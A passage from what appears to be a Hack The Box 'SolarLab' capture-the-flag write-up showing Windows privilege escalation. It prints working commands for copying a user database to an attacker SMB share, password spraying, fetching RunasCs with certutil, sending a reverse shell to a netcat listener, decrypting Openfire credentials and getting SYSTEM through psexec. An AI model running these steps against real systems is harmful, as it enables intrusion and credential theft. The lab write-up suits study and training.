</span></span></code></pre></div><p>where I can see it is loading data from a <code>SQLite</code> database.</p><p>Additionally, checking <code>models.py</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># models.py</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask_sqlalchemy</span> <span class=kn>import</span> <span class=n>SQLAlchemy</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask_login</span> <span class=kn>import</span> <span class=n>UserMixin</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>db</span> <span class=o>=</span> <span class=n>SQLAlchemy</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>User</span><span class=p>(</span><span class=n>UserMixin</span><span class=p>,</span> <span class=n>db</span><span class=o>.</span><span class=n>Model</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>id</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>Column</span><span class=p>(</span><span class=n>db</span><span class=o>.</span><span class=n>Integer</span><span class=p>,</span> <span class=n>primary_key</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>Column</span><span class=p>(</span><span class=n>db</span><span class=o>.</span><span class=n>String</span><span class=p>(</span><span class=mi>50</span><span class=p>),</span> <span class=n>unique</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>nullable</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>password</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>Column</span><span class=p>(</span><span class=n>db</span><span class=o>.</span><span class=n>String</span><span class=p>(</span><span class=mi>100</span><span class=p>),</span> <span class=n>nullable</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span></code></pre></div><p>where I can see <code>username</code> and <code>password</code> variables.</p><p>Searching for <code>users.db</code>, a file being called by <code>app.py</code>, I can see two of them:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Users\blake\Documents\app&gt; cmd.exe /c dir /b /s *users.db
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\blake\Documents\app\instance\users.db
</span></span></span><span class=line><span class=cl><span class=go>C:\Users\blake\Documents\app\reports\instance\users.db
</span></span></span></code></pre></div><p>I will pass this <code>users.db</code> file to my attacker machine. Since <code>SMB</code> is running, let&rsquo;s us this service. In our attacker machine we use <code>smbserver.py</code> from <code>Impacket</code> and start a shared folder/directory called <code>smb2Folder</code> with the credentials <code>gunzf0x:gunzf0x123</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 /usr/share/doc/python3-impacket/examples/smbserver.py smb2Folder $(pwd) -smb2support -username &#39;gunzf0x&#39; -password &#39;gunzf0x123&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Config file parsed
</span></span></span><span class=line><span class=cl><span class=go>[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
</span></span></span><span class=line><span class=cl><span class=go>[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>In the target machine we establish a connection to our shared directory and, then, copy the file to it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Users\blake\Documents\app&gt; cmd.exe /c net use \\10.10.16.6\smb2Folder /u:gunzf0x gunzf0x123
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>The command completed successfully.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PS C:\Users\blake\Documents\app&gt; copy C:\Users\blake\Documents\app\instance\users.db \\10.10.16.6\smb2Folder\
</span></span></span></code></pre></div><p>Finally, just remember to &ldquo;delete&rdquo; this connection:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Users\blake\Documents\app&gt; cmd.exe /c net use /d \\10.10.16.6\smb2Folder
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>\\10.10.16.6\smb2Folder was deleted successfully.
</span></span></span></code></pre></div><p>Then, in our attacker machine, use <code>SQLite</code> along with <code>.dump</code> command to extract all the info:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sqlite3 users.db
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SQLite version 3.45.1 2024-01-30 16:01:20
</span></span></span><span class=line><span class=cl><span class=go>Enter &#34;.help&#34; for usage hints.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>sqlite&gt; .dump
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PRAGMA foreign_keys=OFF;
</span></span></span><span class=line><span class=cl><span class=go>BEGIN TRANSACTION;
</span></span></span><span class=line><span class=cl><span class=go>CREATE TABLE user (
</span></span></span><span class=line><span class=cl><span class=go>        id INTEGER NOT NULL,
</span></span></span><span class=line><span class=cl><span class=go>        username VARCHAR(50) NOT NULL,
</span></span></span><span class=line><span class=cl><span class=go>        password VARCHAR(100) NOT NULL,
</span></span></span><span class=line><span class=cl><span class=go>        PRIMARY KEY (id),
</span></span></span><span class=line><span class=cl><span class=go>        UNIQUE (username)
</span></span></span><span class=line><span class=cl><span class=go>);
</span></span></span><span class=line><span class=cl><span class=go>INSERT INTO user VALUES(1,&#39;blakeb&#39;,&#39;ThisCanB3typedeasily1@&#39;);
</span></span></span><span class=line><span class=cl><span class=go>INSERT INTO user VALUES(2,&#39;claudias&#39;,&#39;007poiuytrewq&#39;);
</span></span></span><span class=line><span class=cl><span class=go>INSERT INTO user VALUES(3,&#39;alexanderk&#39;,&#39;HotP!fireguard&#39;);
</span></span></span><span class=line><span class=cl><span class=go>COMMIT;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>sqlite&gt; select * from user;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>1|blakeb|ThisCanB3typedeasily1@
</span></span></span><span class=line><span class=cl><span class=go>2|claudias|007poiuytrewq
</span></span></span><span class=line><span class=cl><span class=go>3|alexanderk|HotP!fireguard
</span></span></span></code></pre></div><p>where we have 3 users and passwords: <code>blakeb:ThisCanB3typedeasily1@</code> (the one we have already found), <code>claudias:007poiuytrewq</code>, and <code>alexanderk:HotP!fireguard</code>.</p><p>However, in the target machine, if I check what users we have available (running <code>net user</code>), I do not see <code>claudias</code> or <code>alexanderk</code>; instead, I can only see an <code>openfire</code> user, so this makes me think that <code>Openfire</code> is running in this machine.</p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Info</div><div class=notice-content><code>Openfire</code> is a real time collaboration (RTC) server licensed under the Open Source Apache License. It uses the only widely adopted open protocol for instant messaging, <code>XMPP</code> (also called Jabber). <code>Openfire</code> is incredibly easy to setup and administer, but offers rock-solid security and performance</div></div><p>We have seen <code>Openfire</code> software previously in <a href=https://app.hackthebox.com/machines/589 class=external-link target=_blank rel=noopener>HTB Jab</a> machine. In short, <code>Openfire</code> is an instant messaging service. Since we have some passwords I will try to pivot to <code>openfire</code> user; if we are lucky, one of the passwords might work. To do this, I will use <code>NetExec</code> with <code>SMB</code> service. I save the found passwords in a file and, then, run in my machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.10.11.16 -u &#39;openfire&#39; -p sqlite_found_passwords.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\openfire:ThisCanB3typedeasily1@ STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\openfire:007poiuytrewq STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\openfire:HotP!fireguard
</span></span></span></code></pre></div><p>So we have credentials: <code>openfire:HotP!fireguard</code>.</p><p>Usually <code>Openfire</code> runs at port <code>9090</code> and <code>9091</code>, which is the case of our victim machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Program Files&gt; netstat -ano | findstr LISTENING | findstr 127.0.0.1:90
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3084
</span></span></span><span class=line><span class=cl><span class=go>  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       3084
</span></span></span></code></pre></div><p>I try to pivot to <code>openfire</code> user with tools like <code>wmiexec.py</code> from <code>Impacket</code>, but did not work since this is not a priviledged user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 /usr/share/doc/python3-impacket/examples/wmiexec.py openfire:&#39;HotP!fireguard&#39;@solarlab.htb &#34;whoami&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] SMBv3.0 dialect used
</span></span></span><span class=line><span class=cl><span class=go>[-] rpc_s_access_denied
</span></span></span></code></pre></div><p>At this point we can call our good old friend <code>RunasCs</code> (download it from <a href=https://github.com/antonioCoco/RunasCs/releases/tag/v1.5 class=external-link target=_blank rel=noopener>its Github repository</a> and decompress it) to pivot to <code>openfire</code> user internally. Start a temporal <code>Python</code> <code>HTTP</code> server in our attacker machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls &amp;&amp; python3 -m http.server 8000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>RunasCs.exe
</span></span></span></code></pre></div><p>and, in the target machine, download the <code>.exe</code> file using <code>certutil</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Users\blake\Documents\app&gt; cmd.exe /c certutil.exe -urlcache -f -split http://10.10.16.6:8000/RunasCs.exe C:\Users\blake\Downloads\runascs.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>****  Online  ****
</span></span></span><span class=line><span class=cl><span class=go>  0000  ...
</span></span></span><span class=line><span class=cl><span class=go>  ca00
</span></span></span><span class=line><span class=cl><span class=go>CertUtil: -URLCache command completed successfully.
</span></span></span></code></pre></div><p>Then, in the target machine use the <code>-r</code> in <code>runascs.exe</code> to send us a reverse shell, after starting a listener on port <code>443</code> with <code>netcat</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Users\blake\Documents\app&gt; C:\Users\blake\Downloads\runascs.exe openfire &#39;HotP!fireguard&#39; cmd.exe -r 10.10.16.6:443 --bypass-uac -t 10
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Running in session 0 with process function CreateProcessWithLogonW()
</span></span></span><span class=line><span class=cl><span class=go>[+] Using Station\Desktop: Service-0x0-86b11$\Default
</span></span></span><span class=line><span class=cl><span class=go>[+] Async process &#39;C:\Windows\system32\cmd.exe&#39; with pid 1164 created in background.
</span></span></span></code></pre></div><p>and in my <code>netcat</code> listener I get a shell as <code>openfire</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.16] 50913
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.19045.4355]
</span></span></span><span class=line><span class=cl><span class=go>(c) Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Windows\system32&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>solarlab\openfire
</span></span></span></code></pre></div><p>Now, at <code>C:\Program Files</code> I can see a <code>Openfire</code> folder:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\&gt;cd Program Files
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>cd Program Files
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Program Files&gt;dir
</span></span></span><span class=line><span class=cl><span class=go>dir
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is 385E-AC57
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of C:\Program Files
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>05/03/2024  02:34 PM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>05/03/2024  02:34 PM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>11/16/2023  10:39 PM    &lt;DIR&gt;          Common Files
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  04:39 PM    &lt;DIR&gt;          Internet Explorer
</span></span></span><span class=line><span class=cl><span class=go>11/17/2023  11:04 AM    &lt;DIR&gt;          Java
</span></span></span><span class=line><span class=cl><span class=go>11/16/2023  10:47 PM    &lt;DIR&gt;          Microsoft Update Health Tools
</span></span></span><span class=line><span class=cl><span class=go>12/07/2019  12:14 PM    &lt;DIR&gt;          ModifiableWindowsApps
</span></span></span><span class=line><span class=cl><span class=go>11/17/2023  03:22 PM    &lt;DIR&gt;          Openfire
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  02:38 PM    &lt;DIR&gt;          RUXIM
</span></span></span><span class=line><span class=cl><span class=go>05/03/2024  02:34 PM    &lt;DIR&gt;          VMware
</span></span></span><span class=line><span class=cl><span class=go>11/17/2023  12:12 AM    &lt;DIR&gt;          Windows Defender
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  04:39 PM    &lt;DIR&gt;          Windows Defender Advanced Threat Protection
</span></span></span><span class=line><span class=cl><span class=go>11/16/2023  11:11 PM    &lt;DIR&gt;          Windows Mail
</span></span></span><span class=line><span class=cl><span class=go>11/16/2023  11:11 PM    &lt;DIR&gt;          Windows Media Player
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  04:39 PM    &lt;DIR&gt;          Windows Multimedia Platform
</span></span></span><span class=line><span class=cl><span class=go>12/07/2019  12:50 PM    &lt;DIR&gt;          Windows NT
</span></span></span><span class=line><span class=cl><span class=go>11/16/2023  11:11 PM    &lt;DIR&gt;          Windows Photo Viewer
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  04:39 PM    &lt;DIR&gt;          Windows Portable Devices
</span></span></span><span class=line><span class=cl><span class=go>12/07/2019  12:31 PM    &lt;DIR&gt;          Windows Security
</span></span></span><span class=line><span class=cl><span class=go>12/07/2019  12:31 PM    &lt;DIR&gt;          WindowsPowerShell
</span></span></span><span class=line><span class=cl><span class=go>               0 File(s)              0 bytes
</span></span></span><span class=line><span class=cl><span class=go>              20 Dir(s)   7,742,881,792 bytes free
</span></span></span></code></pre></div><p>I note that, as <code>openfire</code> user I can read this directory:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Program Files&gt;icacls Openfire
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>icacls Openfire
</span></span></span><span class=line><span class=cl><span class=go>Openfire SOLARLAB\blake:(OI)(CI)(N)
</span></span></span><span class=line><span class=cl><span class=go>         NT SERVICE\TrustedInstaller:(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>         NT AUTHORITY\SYSTEM:(OI)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>         BUILTIN\Administrators:(OI)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>         CREATOR OWNER:(OI)(CI)(IO)(F)
</span></span></span><span class=line><span class=cl><span class=go>         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
</span></span></span><span class=line><span class=cl><span class=go>         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)
</span></span></span><span class=line><span class=cl><span class=go>         SOLARLAB\openfire:(OI)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Successfully processed 1 files; Failed processing 0 files
</span></span></span></code></pre></div><p>and I cannot as <code>blakeb</code> user.</p><p>Finally, at <code>C:\Program Files\Openfire\embedded-db</code> I can see a file called <code>openfire.script</code>. Reading it shows us:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Program Files\Openfire\embedded-db&gt;type openfire.script
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>type openfire.script
</span></span></span><span class=line><span class=cl><span class=go>SET DATABASE UNIQUE NAME HSQLDB8BDD3B2742
</span></span></span><span class=line><span class=cl><span class=go>SET DATABASE GC 0
</span></span></span><span class=line><span class=cl><span class=go>SET DATABASE DEFAULT RESULT MEMORY ROWS 0
</span></span></span><span class=line><span class=cl><span class=go>SET DATABASE EVENT LOG LEVEL 0
</span></span></span><span class=line><span class=cl><span class=go>SET DATABASE TRANSACTION CONTROL LOCKS
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>SET FILES LOG SIZE 20
</span></span></span><span class=line><span class=cl><span class=go>CREATE USER SA PASSWORD DIGEST &#39;d41d8cd98f00b204e9800998ecf8427e&#39;
</span></span></span><span class=line><span class=cl><span class=go>ALTER USER SA SET LOCAL TRUE
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>SET SCHEMA PUBLIC
</span></span></span><span class=line><span class=cl><span class=go>INSERT INTO OFUSER VALUES(&#39;admin&#39;,&#39;gjMoswpK+HakPdvLIvp6eLKlYh0=&#39;,&#39;9MwNQcJ9bF4YeyZDdns5gvXp620=&#39;,&#39;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#39;,4096,NULL,&#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#39;,&#39;Administrator&#39;,&#39;admin@solarlab.htb&#39;,&#39;001700223740785&#39;,&#39;0&#39;)
</span></span></span><span class=line><span class=cl><span class=go>INSERT INTO OFUSERPROP VALUES(&#39;admin&#39;,&#39;console.rows_per_page&#39;,&#39;/session-summary.jsp=25&#39;)
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>INSERT INTO OFPROPERTY VALUES(&#39;cache.MUCService&#39;&#39;conference&#39;&#39;Rooms.size&#39;,&#39;-1&#39;,0,NULL)
</span></span></span><span class=line><span class=cl><span class=go>INSERT INTO OFPROPERTY VALUES(&#39;passwordKey&#39;,&#39;hGXiFzsKaAeYLjn&#39;,0,NULL)
</span></span></span><span class=line><span class=cl><span class=go>INSERT INTO OFPROPERTY VALUES(&#39;provider.admin.className&#39;,&#39;org.jivesoftware.openfire.admin.DefaultAdminProvider&#39;,0,NULL)
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>Apparently, this is a script to automate some tasks in <code>Openfire</code>.</p><p>However, the password is not in plain text. It is encrypted. So we could use <a href=https://github.com/c0rdis/openfire_decrypt class=external-link target=_blank rel=noopener>Openfire_decrypt repository</a> to decrypt this password. Based on <a href=https://hashcat.net/forum/archive/index.php?thread-2399.html class=external-link target=_blank rel=noopener>this Hashcat forum post</a> we need 2 parameters to decrypt the password: <code>encryptedPassword</code> and <code>passwordKey</code>. The first parameter, <code>encryptedPassword</code> is not explicitly given, but <code>passwordKey</code> is. So we have 1 of 2. There is a line in the script that is interesting:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>CREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),ITERATIONS INTEGER,PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(255),NAME VARCHAR(100),EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME))
</span></span></span></code></pre></div><p>here I can see that <code>ENCRYPTEDPASSWORD VARCHAR(255)</code> is in the 7th column of table <code>PUBLIC.USER</code>. In the script we also have the line:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>INSERT INTO OFUSER VALUES(&#39;admin&#39;,&#39;gjMoswpK+HakPdvLIvp6eLKlYh0=&#39;,&#39;9MwNQcJ9bF4YeyZDdns5gvXp620=&#39;,&#39;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#39;,4096,NULL,&#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#39;,&#39;Administrator&#39;,&#39;admin@solarlab.htb&#39;,&#39;001700223740785&#39;,&#39;0&#39;)
</span></span></span></code></pre></div><p>where the 7th column is the hash <code>becb0&lt;SNIP>9d442</code> for <code>admin</code> user.
So we have the 2 things needed to decrypt the password:</p><ol><li><code>encryptedPassword</code> value: <code>becb0c67&lt;SNIP>2e59d442</code></li><li><code>passwordKey</code> value: <code>hGXiFzsKaAeYLjn</code></li></ol><p>Now, in our attacker machine, just clone the <code>Openfire</code> decryptor repository and pass the found data:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ git clone https://github.com/c0rdis/openfire_decrypt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>‚ùØ cd openfire_decrypt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ java OpenFireDecryptPass.java &#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#39; &#39;hGXiFzsKaAeYLjn&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span></span><span class=line><span class=cl><span class=go>ThisPasswordShouldDo!@ (hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)
</span></span></span></code></pre></div><p>Where we have a password: <code>ThisPasswordShouldDo!@</code></p><p>Before using this password in <code>Openfire</code> GUI panel, I will check if this password is used by another user in the system like, for example, <code>Administrator</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.10.11.16 -u &#39;Administrator&#39; -p &#39;ThisPasswordShouldDo!@&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\Administrator:ThisPasswordShouldDo!@ (Pwn3d!)
</span></span></span></code></pre></div><p>and it works.</p><p>Finally, since <code>SMB</code> service is running in the victim machine, I will use <code>psexec.py</code> from <code>Impacket</code> to spawn an interactive shell as <code>nt authority/system</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:&#39;ThisPasswordShouldDo!@&#39;@10.10.11.16 cmd.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Requesting shares on 10.10.11.16.....
</span></span></span><span class=line><span class=cl><span class=go>[*] Found writable share ADMIN$
</span></span></span><span class=line><span class=cl><span class=go>[*] Uploading file TKSzIKUt.exe
</span></span></span><span class=line><span class=cl><span class=go>[*] Opening SVCManager on 10.10.11.16.....
</span></span></span><span class=line><span class=cl><span class=go>[*] Creating service bbPo on 10.10.11.16.....
</span></span></span><span class=line><span class=cl><span class=go>[*] Starting service bbPo.....
</span></span></span><span class=line><span class=cl><span class=go>[!] Press help for extra shell commands
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.19045.4355]
</span></span></span><span class=line><span class=cl><span class=go>(c) Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Windows\system32&gt; whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nt authority\system
</span></span></span></code></pre></div><p>Where we can read the root flag at <code>Administrator</code> Desktop.</p><p>~ Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>